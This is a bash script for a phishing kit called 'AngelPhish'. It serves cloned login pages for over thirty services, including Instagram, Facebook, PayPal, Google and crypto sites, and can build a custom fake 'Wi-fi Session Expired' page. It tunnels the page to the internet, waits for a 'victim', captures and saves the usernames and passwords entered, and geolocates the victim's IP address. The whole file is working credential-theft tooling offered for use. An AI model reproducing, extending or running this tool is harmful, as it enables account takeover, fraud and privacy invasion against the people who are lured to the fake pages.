#!/bin/bash
# AngelPhish v1.0
# Script by liar

clear
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {
printf "\n"
printf "\e[1;93m               .:.:.\e[0m\e[1;91m Phishing Tool coded by:\e[0m\en @Lrnd.__ \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
printf "            \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;93m Custom    \e[0m\e[1;94m \n"                                
printf "            \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m eBay   \e[0m\n"
printf "            \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest   \e[0m\n"
printf "            \e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m CryptoCurrency   \e[0m\n"                
printf "            \e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m Verizon   \e[0m\n"                
printf "            \e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m DropBox   \e[0m \n"
printf "            \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m Adobe ID   \e[0m \n"
printf "            \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m Shopify   \e[0m  \n"        
printf "            \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m Messenger   \e[0m \n"         
printf "            \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m GitLab   \e[0m    \n"
printf "            \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m Twitch   \e[0m     \n"
printf "            \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m MySpace   \e[0m    \n"
printf "            \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m Badoo   \e[0m      \n"
printf "            \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m VK   \e[0m         \n"
printf "            \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m Yandex   \e[0m     \n"
printf "            \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m devianART   \e[0m \n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="facebook"
start1
elif [[ $option == 3 || $option == 03 ]]; then
server="snapchat"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1
elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1
elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="paypal"
start1

elif [[ $option == 10 ]]; then
server="origin"
start1

elif [[ $option == 11 ]]; then
server="steam"
start1

elif [[ $option == 12 ]]; then
server="yahoo"
start1

elif [[ $option == 13 ]]; then
server="linkedin"
start1

elif [[ $option == 14 ]]; then
server="protonmail"
start1

elif [[ $option == 15 ]]; then
server="wordpress"
start1

elif [[ $option == 16 ]]; then
server="microsoft"
start1

elif [[ $option == 17 ]]; then
server="instafollowers"
start1

elif [[ $option == 18 ]]; then
server="shopping"
start1

elif [[ $option == 19 ]]; then
server="pinterest"
start1

elif [[ $option == 20 ]]; then
server="cryptocurrency"
start1

elif [[ $option == 21 ]]; then
server="verizon"
start1

elif [[ $option == 22 ]]; then
server="dropbox"
start1

elif [[ $option == 23 ]]; then
server="adobe"
start1

elif [[ $option == 24 ]]; then
server="shopify"
start1

elif [[ $option == 25 ]]; then
server="messenger"
start1

elif [[ $option == 26 ]]; then
server="gitlab"
start1

elif [[ $option == 27 ]]; then
server="twitch"
start1

elif [[ $option == 28 ]]; then
server="myspace"
start1

elif [[ $option == 29 ]]; then
server="badoo"
start1

elif [[ $option == 30 ]]; then
server="vk"
start1

elif [[ $option == 31 ]]; then
server="yandex"
start1

elif [[ $option == 32 ]]; then
server="devianart"
start1

elif [[ $option == 33 ]]; then
server="create"
createpage
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
cat logo.txt | lolcat 
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



}


createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf "\n"
printf "\e[1;93m               .:.:.\e[0m\e[1;91m Thanku for Using my Tool Script by:\e[0m\en @Lrnd.__ \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}


start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Input your PHP Server port :  \e[0m\en' php_port
#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Input Ngrok Authtoken (y/n) :  \e[0m\en' op
#if [[ $op == y ]];
#then
#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Your Ngrok Authtoken ? :  \e[0m\en' ngrok_token
#ngrok authtoken $ngrok_token
#else
#sleep 1
#fi
loginloclx() {
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Do you want to Input LocalXpose Token? [MANDATORY FOR THE FIRST TIME!] (y/n) :  \e[0m\en' op2
}
cd sites/$server && php -S 127.0.0.1:${php_port} > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] PHP Server  : \e[0m\en127.0.0.1:${php_port}"
loginloclx
if [[ $op2 == y ]]; 
then 
loclx account login 
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Copy, and paste this command in new window for generate LocalXpose link\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Command : \e[0m./loclx tunnel http --to 127.0.0.1:${php_port} OR loclx tunnel http --to 127.0.0.1:${php_port}\n"
elif [[ $op2 == n ]];
then
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Copy, and paste this command in new window for generate LocalXpose link\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Command : \e[0m./loclx tunnel http --to 127.0.0.1:${php_port} OR loclx tunnel http --to 127.0.0.1:${php_port}\n"
else 
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] INPUT WRONG, TRY AGAIN\e[0m"
loginloclx
fi
#lc_url=$(grep https://[-0-9a-z.]*.loclx.io)
#echo $lc_url
#printf "\e[1;92m[\e[0m*\e[1;92m] LocalXpose Server  :\e[0m\en  https://${subdo}.loclx.io"
#printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Copy, and paste this command in new window for generate LocalXpose link\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Command : \e[0m./loclx tunnel http --to 127.0.0.1:${php_port}\n"
checkfound



}
checkfound() {

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
while [ true ] ; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf sites/$server/usernames.txt

fi
sleep 0.5
done 

}
cat logo.txt | lolcat 
dependencies
menu

